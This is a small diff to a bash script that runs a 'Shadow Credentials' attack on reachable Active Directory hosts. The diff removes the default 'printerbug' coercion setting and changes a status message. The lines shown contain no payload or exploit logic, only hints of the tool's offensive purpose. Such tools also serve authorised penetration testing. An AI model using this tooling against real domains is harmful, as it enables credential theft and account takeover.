@@ -20,11 +20,6 @@ usage() {
   exit 1
 }
 
-# Default coercion method
-COERCE_METHOD="printerbug"
-LISTEN_NETBIOS=""
-
-# Parse command-line arguments
 while [[ "$#" -gt 0 ]]; do
   case $1 in
     -d) DOMAIN="$2"; shift ;;
@@ -63,7 +58,7 @@ if [ ! -s $REACHABLE_HOSTS ]; then
   exit 1
 fi
 
-echo "[+] Starting Shadow Credentials attack on reachable targets using $COERCE_METHOD..."
+echo "[+] Starting Shadow Credentials attack on reachable targets"
 
 while read -r target; do
   SHADOW_TARGET=$(echo "$target" | cut -d '.' -f 1)$
